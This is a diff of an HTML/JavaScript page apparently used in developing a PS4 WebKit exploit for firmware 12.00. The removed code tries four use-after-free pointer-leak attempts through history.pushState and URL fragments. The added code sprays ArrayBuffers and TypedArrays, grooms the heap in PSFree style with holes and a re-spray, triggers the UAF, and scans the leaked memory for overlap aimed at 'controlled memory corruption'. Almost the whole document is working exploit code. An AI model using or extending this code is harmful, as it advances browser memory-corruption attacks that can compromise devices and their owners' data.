@@ -1,22 +1,56 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit UAF - Real Pointer Leak 3</title>
+<title>PS4 12.00 - WebKit Structure Discovery</title>
 </head>
 <body>
-<h2>PS4 WebKit UAF - Real Pointer Leak Attempts</h2>
-<button onclick="runStateSerializationLeak()">ATTEMPT 1 - State Serialization Leak</button>
-<button onclick="runDOMReferenceLeak()">ATTEMPT 2 - DOM Reference Leak</button>
-<button onclick="runArrayBufferLeak()">ATTEMPT 3 - ArrayBuffer Backing Store Leak</button>
-<button onclick="runFunctionObjectLeak()">ATTEMPT 4 - Function Object Leak</button>
+<h2>PS4 12.00 - WebKit Structure Size Discovery</h2>
+<p>Based on PSFree techniques, adapted for version 12.00</p>
+
+<button onclick="discoverArrayBufferSize()">TEST 1 - ArrayBuffer Size</button>
+<button onclick="discoverTypedArraySize()">TEST 2 - TypedArray Size</button>
+<button onclick="combineWithUAF()">TEST 3 - Combine with UAF</button>
+
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+// Int64 class (from PSFree)
+class Int64 {
+    constructor(low, high) {
+        this.low = low >>> 0;
+        this.high = high >>> 0;
+    }
+    
+    toString() {
+        return '0x' + 
+               this.high.toString(16).padStart(8, '0') + 
+               this.low.toString(16).padStart(8, '0');
+    }
+    
+    add(offset) {
+        let low = (this.low + offset) >>> 0;
+        let high = this.high;
+        if(low < this.low) high = (high + 1) >>> 0;
+        return new Int64(low, high);
+    }
+    
+    static fromBytes(bytes, offset) {
+        let low = bytes[offset] |
+                  (bytes[offset+1] << 8) |
+                  (bytes[offset+2] << 16) |
+                  (bytes[offset+3] << 24);
+        let high = bytes[offset+4] |
+                   (bytes[offset+5] << 8) |
+                   (bytes[offset+6] << 16) |
+                   (bytes[offset+7] << 24);
+        return new Int64(low >>> 0, high >>> 0);
+    }
+}
 
 function encodeBytes(bytes) {
     return bytes.map(b => '%' + b.toString(16).padStart(2,'0')).join('');
@@ -32,339 +66,246 @@ function decodeHexString(str) {
     return result;
 }
 
-function readU32(bytes, offset) {
-    if(offset + 3 >= bytes.length) return null;
-    return bytes[offset] |
-           (bytes[offset+1] << 8) |
-           (bytes[offset+2] << 16) |
-           (bytes[offset+3] << 24);
-}
-
-function isLikelyPointer(val) {
-    // PS4 userspace addresses typically 0x00xxxxxx - 0x7Fxxxxxx
-    // But we're limited to ASCII (0x00-0x7F per byte)
-    // So max is 0x7F7F7F7F
-    
-    // Look for values that:
-    // - Are non-zero
-    // - Have reasonable distribution (not all same byte)
-    // - Are 4-byte aligned (bottom 2 bits = 0)
-    
-    if(val === 0) return false;
-    if(val === 0x11111111 || val === 0x22222222) return false; // our test values
-    
-    let b0 = val & 0xFF;
-    let b1 = (val >> 8) & 0xFF;
-    let b2 = (val >> 16) & 0xFF;
-    let b3 = (val >> 24) & 0xFF;
-    
-    // Check if bytes are varied
-    if(b0 === b1 && b1 === b2 && b2 === b3) return false;
-    
-    // Check alignment
-    if((val & 0x3) !== 0) return false;
-    
-    return true;
-}
-
-// ATTEMPT 1 - State serialization
-async function runStateSerializationLeak(){
+// =====================================================
+// TEST 1: Discover ArrayBuffer allocation size
+// =====================================================
+async function discoverArrayBufferSize(){
     logEl.textContent = "";
-    log("=== ATTEMPT 1: State Serialization Leak ===\n");
+    log("=== ArrayBuffer Size Discovery ===\n");
+    log("Strategy: Spray ArrayBuffers, trigger UAF, detect patterns\n");
     
-    log("Strategy: Put complex objects in history.state");
-    log("Hope StructuredClone leaks internal pointers\n");
-    
-    let size = 977;
-    const STEP = 14461;
-    
-    // Create objects to leak
-    let leakTargets = {
-        buffer: new ArrayBuffer(1024),
-        array: new Uint32Array(256),
-        string: "A".repeat(1000),
-        nested: {
-            a: new ArrayBuffer(512),
-            b: new Uint32Array(128)
-        }
-    };
-    
-    log("[SETUP] Triggering UAF with complex state objects...");
-    
-    for(let i=0; i<48; i++){
-        let frag = encodeBytes(Array(size).fill(0x41 + (i % 26)));
-        
-        // Include leak targets in state
-        let state = {
-            iter: i,
-            targets: leakTargets,
-            marker: 0x12345678
-        };
-        
-        history.pushState(state, "", "#" + frag);
-        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-        
-        size += STEP;
-        await sleep(5);
-    }
-    
-    await sleep(120);
-    
-    let frames = [];
-    for(let i=0; i<10; i++){
-        let f = document.createElement("iframe");
-        document.body.appendChild(f);
-        try {
-            let d = f.contentDocument;
-            d.open();
-            d.write("<html><body>X</body></html>");
-            d.close();
-        } catch(e){}
-        frames.push(f);
-    }
-    frames.forEach(f=>f.remove());
-    await sleep(80);
-    
-    log("\n[LEAK] Reading URL...");
-    let url = document.URL;
-    let hashStart = url.indexOf('#');
-    let encoded = url.substring(hashStart + 1);
-    let decoded = decodeHexString(encoded);
-    
-    log("Decoded bytes: " + decoded.length + "\n");
-    
-    log("[SCAN] Looking for non-injected values (potential pointers):");
-    
-    let candidates = [];
-    for(let i=0; i<decoded.length-3; i+=4){
-        let val = readU32(decoded, i);
-        if(isLikelyPointer(val)){
-            candidates.push({offset: i, value: val});
-        }
-    }
-    
-    log("Pointer candidates found: " + candidates.length);
-    
-    if(candidates.length > 0){
-        log("\nTop 10 candidates:");
-        candidates.slice(0, 10).forEach(c => {
-            log("  Offset " + c.offset + ": 0x" + c.value.toString(16).padStart(8,'0'));
-        });
-        log("\nPOSSIBLE REAL POINTER LEAK!");
-    } else {
-        log("\nNo likely pointers found");
-    }
-    
-    log("\n=== ATTEMPT 1 END ===");
-}
-
-// ATTEMPT 2 - DOM reference
-async function runDOMReferenceLeak(){
-    logEl.textContent = "";
-    log("=== ATTEMPT 2: DOM Reference Leak ===\n");
-    
-    log("Strategy: Store DOM nodes in history state");
-    log("DOM nodes contain many internal pointers\n");
-    
-    // Create DOM nodes
-    let div = document.createElement("div");
-    div.id = "leak_target";
-    div.innerHTML = "<span>test</span>";
-    document.body.appendChild(div);
-    
-    let size = 977;
-    const STEP = 14461;
-    
-    log("[SETUP] Triggering UAF with DOM references...");
-    
-    for(let i=0; i<47; i++){
-        let frag = encodeBytes(Array(size).fill(0x42));
-        
-        let state = {
-            iter: i,
-            dom: div,
-            child: div.firstChild,
-            text: div.firstChild.firstChild
-        };
-        
-        history.pushState(state, "", "#" + frag);
-        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-        
-        size += STEP;
-        await sleep(5);
-    }
-    
-    await sleep(120);
-    
-    let frames = [];
-    for(let i=0; i<50; i++){
-        let f = document.createElement("iframe");
-        document.body.appendChild(f);
-        try {
-            let d = f.contentDocument;
-            d.open();
-            d.write("<html><body>X</body></html>");
-            d.close();
-        } catch(e){}
-        frames.push(f);
-    }
-    frames.forEach(f=>f.remove());
-    await sleep(80);
-    
-    log("\n[LEAK] Reading URL...");
-    let url = document.URL;
-    let hashStart = url.indexOf('#');
-    let encoded = url.substring(hashStart + 1);
-    let decoded = decodeHexString(encoded);
-    
-    log("Decoded bytes: " + decoded.length);
-    
-    // Check if all bytes are 0x42
-    let nonB = 0;
-    for(let i=0; i<Math.min(1000, decoded.length); i++){
-        if(decoded[i] !== 0x42) nonB++;
-    }
-    
-    log("Non-0x42 bytes in first 1000: " + nonB);
-    
-    if(nonB > 10){
-        log("\nDifferent data detected - analyzing...");
-        
-        log("\nFirst 100 bytes (hex):");
-        let hex = "";
-        for(let i=0; i<100 && i<decoded.length; i++){
-            hex += decoded[i].toString(16).padStart(2,'0') + " ";
-            if((i+1) % 16 === 0) {
-                log(hex);
-                hex = "";
-            }
-        }
-    } else {
-        log("\nAll bytes are 0x42 - DOM not serialized to fragment");
-    }
-    
-    log("\n=== ATTEMPT 2 END ===");
-}
-
-// ATTEMPT 3 - ArrayBuffer backing store
-async function runArrayBufferLeak(){
-    logEl.textContent = "";
-    log("=== ATTEMPT 3: ArrayBuffer Backing Store Leak ===\n");
-    
-    log("Strategy: ArrayBuffer has backing store pointer");
-    log("Try to leak it via fragment corruption\n");
-    
-    let size = 977;
-    const STEP = 14461;
-    
-    log("[SETUP] Creating large ArrayBuffers...");
+    // Spray ArrayBuffers of known sizes
+    log("[SPRAY] Creating ArrayBuffers...");
     let buffers = [];
-    for(let i=0; i<47; i++){
-        buffers.push(new ArrayBuffer(4096));
-    }
+    let sizes = [64, 128, 256, 512, 1024, 2048];
     
-    log("[SETUP] Triggering UAF...");
-    
-    for(let i=0; i<48; i++){
-        // Fill with controlled pattern
-        let pattern = [];
-        for(let j=0; j<size; j++){
-            pattern.push(0x43 + (j % 16));
+    for(let size of sizes) {
+        for(let i=0; i<50; i++) {
+            let buf = new ArrayBuffer(size);
+            let view = new Uint32Array(buf);
+            
+            // Fill with recognizable pattern
+            for(let j=0; j<view.length; j++) {
+                view[j] = (size << 16) | i; // Encode size and index
+            }
+            
+            buffers.push({size: size, buffer: buf});
         }
-        let frag = encodeBytes(pattern);
-        
-        history.pushState({buffers: buffers}, "", "#" + frag);
-        history.replaceState({buffers: buffers}, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-        
-        size += STEP;
-        await sleep(5);
     }
     
-    await sleep(120);
+    log(`Sprayed ${buffers.length} ArrayBuffers\n`);
     
-    let frames = [];
-    for(let i=0; i<80; i++){
-        let f = document.createElement("iframe");
-        document.body.appendChild(f);
-        try {
-            let d = f.contentDocument;
-            d.open();
-            d.write("<html><body>X</body></html>");
-            d.close();
-        } catch(e){}
-        frames.push(f);
-    }
-    frames.forEach(f=>f.remove());
-    await sleep(80);
+    await sleep(100);
     
-    log("\n[LEAK] Reading URL...");
+    // Trigger UAF
+    log("[UAF] Triggering UAF...");
+    await triggerUAFWithPattern();
+    
+    log("\n[ANALYZE] Reading leaked data...");
     let url = document.URL;
     let hashStart = url.indexOf('#');
     let encoded = url.substring(hashStart + 1);
     let decoded = decodeHexString(encoded);
     
-    log("Decoded bytes: " + decoded.length + "\n");
+    log(`Decoded bytes: ${decoded.length}\n`);
     
-    log("[SCAN] Looking for unexpected patterns:");
+    // Look for ArrayBuffer patterns
+    log("[SCAN] Looking for ArrayBuffer signatures:");
+    let found = new Map();
     
-    let unexpected = [];
-    for(let i=0; i<Math.min(10000, decoded.length); i++){
-        let expected = 0x43 + (i % 16);
-        if(decoded[i] !== expected){
-            unexpected.push({offset: i, expected: expected, actual: decoded[i]});
+    for(let i=0; i<Math.min(decoded.length-4, 50000); i+=4) {
+        let val = decoded[i] |
+                  (decoded[i+1] << 8) |
+                  (decoded[i+2] << 16) |
+                  (decoded[i+3] << 24);
+        
+        let size = val >>> 16;
+        let index = val & 0xFFFF;
+        
+        if(sizes.includes(size) && index < 50) {
+            let key = `size_${size}`;
+            found.set(key, (found.get(key) || 0) + 1);
         }
     }
     
-    log("Unexpected bytes: " + unexpected.length);
-    
-    if(unexpected.length > 0){
-        log("\nFirst 10 unexpected bytes:");
-        unexpected.slice(0, 10).forEach(u => {
-            log("  Offset " + u.offset + ": expected 0x" + 
-                u.expected.toString(16) + ", got 0x" + 
-                u.actual.toString(16));
-        });
-        log("\nPOSSIBLE CORRUPTION OR LEAK!");
+    log("ArrayBuffer patterns found:");
+    for(let [key, count] of found) {
+        log(`  ${key}: ${count} occurrences`);
     }
     
-    log("\n=== ATTEMPT 3 END ===");
+    if(found.size > 0) {
+        log("\nSUCCESS: ArrayBuffer data leaked!");
+        log("This indicates heap overlap with UAF");
+    }
+    
+    log("\n=== TEST 1 END ===");
 }
 
-// ATTEMPT 4 - Function object
-async function runFunctionObjectLeak(){
+// =====================================================
+// TEST 2: TypedArray size discovery
+// =====================================================
+async function discoverTypedArraySize(){
     logEl.textContent = "";
-    log("=== ATTEMPT 4: Function Object Leak ===\n");
+    log("=== TypedArray Size Discovery ===\n");
     
-    log("Strategy: Function objects contain code pointers");
-    log("Try to leak via state serialization\n");
+    log("[SPRAY] Creating TypedArrays with markers...");
+    let arrays = [];
     
+    for(let i=0; i<500; i++) {
+        let buf = new ArrayBuffer(256);
+        let u32 = new Uint32Array(buf);
+        let u8 = new Uint8Array(buf);
+        
+        // Marker pattern
+        u32[0] = 0x54415252; // "TARR" = TypedARRay
+        u32[1] = i;
+        u32[2] = 256; // size
+        
+        arrays.push({u32: u32, u8: u8});
+    }
+    
+    log(`Sprayed ${arrays.length} TypedArrays\n`);
+    await sleep(100);
+    
+    log("[UAF] Triggering UAF...");
+    await triggerUAFWithPattern();
+    
+    log("\n[ANALYZE] Scanning for TypedArray signatures...");
+    let url = document.URL;
+    let hashStart = url.indexOf('#');
+    let encoded = url.substring(hashStart + 1);
+    let decoded = decodeHexString(encoded);
+    
+    // Look for "TARR" marker
+    let tarrFound = 0;
+    for(let i=0; i<decoded.length-4; i++) {
+        if(decoded[i] === 0x52 &&      // R
+           decoded[i+1] === 0x52 &&    // R
+           decoded[i+2] === 0x41 &&    // A
+           decoded[i+3] === 0x54) {    // T
+            log(`Found "TARR" at offset ${i}`);
+            
+            // Read next dword (should be index)
+            if(i+8 < decoded.length) {
+                let idx = decoded[i+4] |
+                         (decoded[i+5] << 8) |
+                         (decoded[i+6] << 16) |
+                         (decoded[i+7] << 24);
+                log(`  Index: ${idx}`);
+            }
+            
+            tarrFound++;
+            if(tarrFound >= 5) break;
+        }
+    }
+    
+    if(tarrFound > 0) {
+        log(`\nSUCCESS: Found ${tarrFound} TypedArray signatures`);
+    } else {
+        log("\nNo TypedArray signatures found");
+    }
+    
+    log("\n=== TEST 2 END ===");
+}
+
+// =====================================================
+// TEST 3: Combine PSFree technique with your UAF
+// =====================================================
+async function combineWithUAF(){
+    logEl.textContent = "";
+    log("=== PSFree Heap Feng Shui + UAF ===\n");
+    log("Applying PSFree grooming techniques to 12.00 UAF\n");
+    
+    // Phase 1: Initial spray (PSFree technique)
+    log("[PHASE 1] Initial ArrayBuffer spray...");
+    let spray1 = [];
+    for(let i=0; i<1000; i++) {
+        let buf = new ArrayBuffer(0x1000);
+        let view = new Uint32Array(buf);
+        view[0] = 0x41414141 + i; // Marker
+        spray1.push(buf);
+    }
+    log(`  Sprayed ${spray1.length} buffers (4KB each)`);
+    
+    await sleep(50);
+    
+    // Phase 2: Create holes (PSFree technique)
+    log("\n[PHASE 2] Creating heap holes...");
+    for(let i=0; i<spray1.length; i+=3) {
+        spray1[i] = null;
+    }
+    log(`  Created ~${Math.floor(spray1.length/3)} holes`);
+    
+    await sleep(50);
+    
+    // Phase 3: Trigger your UAF
+    log("\n[PHASE 3] Triggering UAF in prepared heap...");
+    await triggerUAFWithPattern();
+    
+    // Phase 4: Secondary spray (PSFree technique)
+    log("\n[PHASE 4] Secondary spray to occupy freed slots...");
+    let spray2 = [];
+    for(let i=0; i<500; i++) {
+        let buf = new ArrayBuffer(0x1000);
+        let view = new Uint32Array(buf);
+        view[0] = 0x42424242 + i; // Different marker
+        spray2.push(buf);
+    }
+    log(`  Sprayed ${spray2.length} buffers`);
+    
+    await sleep(100);
+    
+    // Phase 5: Check for overlap
+    log("\n[PHASE 5] Checking for heap overlap...");
+    let url = document.URL;
+    let hashStart = url.indexOf('#');
+    let encoded = url.substring(hashStart + 1);
+    let decoded = decodeHexString(encoded);
+    
+    // Look for spray1 markers (0x41414141+)
+    let spray1Found = 0;
+    // Look for spray2 markers (0x42424242+)
+    let spray2Found = 0;
+    
+    for(let i=0; i<Math.min(decoded.length-4, 100000); i+=4) {
+        let val = decoded[i] |
+                  (decoded[i+1] << 8) |
+                  (decoded[i+2] << 16) |
+                  (decoded[i+3] << 24);
+        
+        if((val & 0xFFFFFF00) === 0x41414100) spray1Found++;
+        if((val & 0xFFFFFF00) === 0x42424200) spray2Found++;
+    }
+    
+    log(`Spray1 markers found: ${spray1Found}`);
+    log(`Spray2 markers found: ${spray2Found}`);
+    
+    if(spray1Found > 0 || spray2Found > 0) {
+        log("\nCRITICAL: Heap overlap detected!");
+        log("UAF is leaking sprayed ArrayBuffer data");
+        log("This confirms heap feng shui is working");
+        
+        if(spray2Found > 0) {
+            log("\nVERY CRITICAL: spray2 markers found!");
+            log("This means UAF freed slot was reused by spray2");
+            log("Potential for controlled memory corruption");
+        }
+    }
+    
+    log("\n=== TEST 3 END ===");
+}
+
+// Helper: Trigger UAF with pattern data
+async function triggerUAFWithPattern() {
     let size = 977;
     const STEP = 14461;
     
-    let leakFunc = function leakTarget() {
-        return "LEAK";
-    };
-    
-    log("[SETUP] Triggering UAF with function objects...");
-    
     for(let i=0; i<48; i++){
-        let frag = encodeBytes(Array(size).fill(0x44));
+        // Pattern that won't interfere with markers
+        let pattern = encodeBytes(Array(size).fill(0x58));
         
-        let state = {
-            iter: i,
-            func: leakFunc,
-            bound: leakFunc.bind(null),
-            arrow: () => "ARROW"
-        };
-        
-        history.pushState(state, "", "#" + frag);
-        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
+        history.pushState({}, "", "#" + pattern);
+        history.replaceState({}, "", "#" + pattern.slice(0, pattern.length >> 1));
         
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
         
@@ -374,6 +315,7 @@ async function runFunctionObjectLeak(){
     
     await sleep(120);
     
+    // Heap grooming
     let frames = [];
     for(let i=0; i<80; i++){
         let f = document.createElement("iframe");
@@ -387,42 +329,17 @@ async function runFunctionObjectLeak(){
         frames.push(f);
     }
     frames.forEach(f=>f.remove());
+    
     await sleep(80);
-    
-    log("\n[LEAK] Reading URL...");
-    let url = document.URL;
-    let hashStart = url.indexOf('#');
-    let encoded = url.substring(hashStart + 1);
-    let decoded = decodeHexString(encoded);
-    
-    log("Decoded bytes: " + decoded.length);
-    
-    // All should be 0x44 if functions aren't serialized
-    let allD = true;
-    for(let i=0; i<Math.min(1000, decoded.length); i++){
-        if(decoded[i] !== 0x44){
-            allD = false;
-            break;
-        }
-    }
-    
-    if(allD){
-        log("\nAll bytes are 0x44 - functions not serialized");
-    } else {
-        log("\nDifferent data found - possible function serialization!");
-    }
-    
-    log("\n=== ATTEMPT 4 END ===");
 }
 
-log("PS4 WebKit UAF - Real Pointer Leak Attempts");
-log("Goal: Find method to leak WebKit internal pointers");
-log("\nAttempts:");
-log("1. State Serialization - complex objects");
-log("2. DOM References - DOM node pointers");
-log("3. ArrayBuffer - backing store pointers");
-log("4. Function Objects - code pointers");
-log("\nExecute in order - looking for ANY non-injected data");
+log("PS4 12.00 WebKit Structure Discovery");
+log("Based on PSFree (9.00) techniques");
+log("\nTests:");
+log("1. ArrayBuffer size/layout discovery");
+log("2. TypedArray structure discovery");
+log("3. Full PSFree heap feng shui technique");
+log("\nGoal: Find overlaps between UAF and sprayed objects");
 </script>
 </body>
 </html>
